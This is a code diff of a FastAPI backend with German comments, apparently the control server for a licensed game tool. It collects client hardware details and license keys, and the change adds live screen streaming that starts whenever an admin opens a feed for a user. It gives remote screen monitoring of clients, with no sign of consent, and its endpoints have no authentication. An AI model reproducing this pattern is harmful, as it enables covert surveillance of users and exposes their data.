@@ -3,13 +3,13 @@ import sqlite3
 import cv2
 import numpy as np
 from fastapi import FastAPI, HTTPException
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import base64
 import time
 
-app = FastAPI(title="Assmar00 Replay Buffer Backend", version="23.0")
+app = FastAPI(title="Assmar00 On-Demand Control", version="24.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -20,7 +20,8 @@ app.add_middleware(
 )
 
 DB_FILE = "database.db"
-saved_clips = {}
+active_streams = {}
+viewers_watching = set() # Speichert, welche Clients gerade aktiv im Browser angeschaut werden
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
@@ -56,12 +57,9 @@ def init_db():
             expiry TEXT,
             status TEXT DEFAULT 'Aktiv'
         )
-    """ )
+    """)
     
-    defaults = {
-        "command": "none",
-        "min_version": "1.0.0"
-    }
+    defaults = {"min_version": "1.0.0"}
     for k, v in defaults.items():
         cursor.execute("INSERT OR IGNORE INTO global_settings (key, value) VALUES (?, ?)", (k, v))
         
@@ -89,9 +87,9 @@ class ClientData(BaseModel):
     expiry: str = "Lifetime"
     fps: int = 0
 
-class ClipData(BaseModel):
+class FrameData(BaseModel):
     desktop: str
-    clip_b64: str
+    frame_b64: str
 
 @app.get("/", response_class=HTMLResponse)
 def serve_admin():
@@ -100,25 +98,6 @@ def serve_admin():
             return f.read()
     except FileNotFoundError:
         return "<h3>Fehler: admin.html nicht gefunden!</h3>"
-
-@app.get("/api/settings")
-def get_settings():
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT key, value FROM global_settings")
-    rows = cursor.fetchall()
-    conn.close()
-    return {row[0]: row[1] for row in rows}
-
-@app.post("/api/settings")
-def update_settings(data: dict):
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    for k, v in data.items():
-        cursor.execute("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?, ?)", (k, str(v)))
-    conn.commit()
-    conn.close()
-    return {"status": "success"}
 
 @app.get("/api/users")
 def get_users():
@@ -139,12 +118,7 @@ def get_stats():
     cursor.execute("SELECT COUNT(*) FROM keys")
     total_keys = cursor.fetchone()[0]
     conn.close()
-    return {
-        "active_clients": active_clients,
-        "open_tickets": 0,
-        "total_keys": total_keys,
-        "total_bans": 0
-    }
+    return {"active_clients": active_clients, "total_keys": total_keys}
 
 @app.post("/api/client/heartbeat")
 def client_heartbeat(data: ClientData):
@@ -169,25 +143,45 @@ def client_heartbeat(data: ClientData):
         last_seen=CURRENT_TIMESTAMP
     """, (data.desktop, data.custom_name, data.hwid, data.ip, data.cpu, data.gpu, data.motherboard, data.ram, data.os_build, data.game, data.license_key, data.expiry, data.fps))
     conn.commit()
-
-    cursor.execute("SELECT key, value FROM global_settings")
-    settings_rows = cursor.fetchall()
-    global_cfg = {row[0]: row[1] for row in settings_rows}
     conn.close()
     
-    return {"status": "success", "settings": global_cfg}
+    # Prüfen, ob der Admin gerade diesen spezifischen Client anschaut
+    should_stream = data.desktop in viewers_watching
+    return {"status": "success", "stream_active": should_stream}
 
-@app.post("/api/client/clip")
-def receive_clip(data: ClipData):
-    if data.clip_b64:
-        saved_clips[data.desktop] = data.clip_b64
+@app.post("/api/client/frame")
+def client_frame(data: FrameData):
+    if data.frame_b64:
+        try:
+            active_streams[data.desktop] = base64.b64decode(data.frame_b64)
+        except:
+            pass
     return {"status": "success"}
 
-@app.get("/api/get_clip")
-def get_clip(user: str):
-    if user in saved_clips:
-        return {"clip_b64": saved_clips[user]}
-    return {"clip_b64": ""}
+@app.get("/video_feed")
+def video_feed(user: str):
+    viewers_watching.add(user) # Admin schaut zu -> Signal an Client aktivieren
+    def generate_stream():
+        try:
+            while True:
+                if user in active_streams and active_streams[user]:
+                    yield (b'--frame\r\n'
+                           b'Content-Type: image/jpeg\r\n\r\n' + active_streams[user] + b'\r\n')
+                else:
+                    img = np.zeros((480, 640, 3), dtype=np.uint8)
+                    cv2.putText(img, f"Verbinde mit {user}...", (20, 240), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 255), 2)
+                    _, encoded = cv2.imencode('.jpg', img)
+                    yield (b'--frame\r\n'
+                           b'Content-Type: image/jpeg\r\n\r\n' + bytearray(encoded) + b'\r\n')
+                time.sleep(0.1)
+        finally:
+            # Wenn Admin den Browser schließt, fliegt der User aus der Viewer-Liste raus -> Client stoppt sofort Aufnahme!
+            if user in viewers_watching:
+                viewers_watching.remove(user)
+            if user in active_streams:
+                del active_streams[user]
+
+    return StreamingResponse(generate_stream(), media_type="multipart/x-mixed-replace; boundary=frame")
 
 @app.post("/verify")
 def verify_license_endpoint(data: dict):
